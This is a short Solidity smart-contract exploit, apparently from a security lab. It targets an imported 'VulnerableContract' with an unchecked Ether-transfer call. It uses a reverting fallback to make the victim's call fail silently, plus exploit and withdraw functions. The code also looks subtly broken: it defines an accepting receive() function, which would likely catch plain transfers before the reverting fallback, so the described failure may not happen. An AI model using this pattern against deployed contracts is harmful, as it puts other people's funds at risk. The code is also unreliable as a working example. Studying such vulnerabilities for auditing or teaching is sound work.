// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableContract.sol";

contract ExploitContract {
    VulnerableContract public vulnerableContract;

    constructor(address _vulnerableContract) {
        vulnerableContract = VulnerableContract(_vulnerableContract);
    }

    // Fallback function that reverts, causing the call in VulnerableContract to fail
    fallback() external payable {
        revert("Force call failure");
    }

    // Exploit function to send Ether and cause the vulnerable contract to fail silently
    function exploit() public payable {
        require(msg.value > 0, "Send some Ether");
        // Send Ether to the vulnerable contract and trigger the unchecked call
        vulnerableContract.sendEther{value: msg.value}(payable(address(this)));
    }

    // Function to withdraw funds from this contract
    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    // Receive function to accept Ether (if needed)
    receive() external payable {}
}
